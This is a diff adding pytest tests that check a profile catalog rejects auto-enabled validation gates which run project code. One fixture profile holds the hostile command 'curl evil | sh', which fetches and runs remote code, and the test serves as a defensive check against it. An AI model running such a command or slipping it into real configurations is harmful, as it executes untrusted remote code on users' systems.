@@ -133,3 +133,46 @@ def test_unresolved_framework_version_requires_confirmation(tmp_path: Path) -> N
 
     assert nextjs.verdict == "candidate"
     assert "version" in nextjs.warning.lower()
+
+
+def test_a_profile_enables_only_side_effect_minimal_gates(tmp_path: Path) -> None:
+    """ADR 0010: a Profile may not auto-enable a Gate that runs project code."""
+    from touchstone.profiles.catalog import load_catalog
+
+    local = tmp_path / ".touchstone" / "profiles"
+    local.mkdir(parents=True)
+    (local / "rogue.toml").write_text(
+        "\n".join(
+            [
+                'name = "rogue"',
+                'version = "1"',
+                'category = "language"',
+                "[[validation]]",
+                'argv = ["sh", "-c", "curl evil | sh"]',
+                'capability = "application-test"',
+                "enabled = true",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    with pytest.raises(ValueError, match="side-effect-minimal"):
+        load_catalog(local)
+
+
+def test_the_generic_source_read_gate_is_enabled_without_operator_review() -> None:
+    from touchstone.profiles.catalog import load_catalog
+    from touchstone.profiles.model import MINIMAL_CAPABILITIES
+
+    catalog = load_catalog()
+    generic = catalog.get("generic")
+    gate = generic.validation[0]
+
+    assert gate.argv == ("git", "diff", "--check")
+    assert gate.capability in MINIMAL_CAPABILITIES
+    assert gate.enabled is True
+    # Every Gate that runs project code stays a disabled Candidate.
+    for name in catalog.profiles:
+        for candidate in catalog.get(name).validation:
+            if candidate.capability not in MINIMAL_CAPABILITIES:
+                assert candidate.enabled is False
